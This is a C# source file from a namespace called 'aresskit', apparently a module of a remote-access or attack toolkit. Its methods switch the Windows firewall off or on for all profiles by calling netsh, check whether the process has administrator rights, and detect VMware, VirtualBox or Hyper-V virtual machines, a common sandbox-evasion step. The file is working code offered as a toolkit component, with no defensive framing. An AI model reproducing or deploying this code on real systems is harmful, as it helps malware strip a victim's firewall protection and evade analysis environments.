using System.Security.Principal;

namespace aresskit
{
    class Administration
    {
        public bool FirewallStatus(bool option)
        {
            if (option == true)
            {
                return aresskit.Toolkit.exec("NetSh AdvFirewall Set AllProfiles State On").Contains("Ok.") ? true : false;
            }
            else
            {
                return aresskit.Toolkit.exec("NetSh AdvFirewall Set AllProfiles State Off").Contains("Ok.") ? true : false;
            }
        }

        // Thanks to: http://stackoverflow.com/a/11660205/5925502
        public bool IsAdmin()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                    .IsInRole(WindowsBuiltInRole.Administrator);
        }

        // Thanks to: http://stackoverflow.com/a/11145280/5925502
        public bool DetectVirtualMachine()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }
    }
}
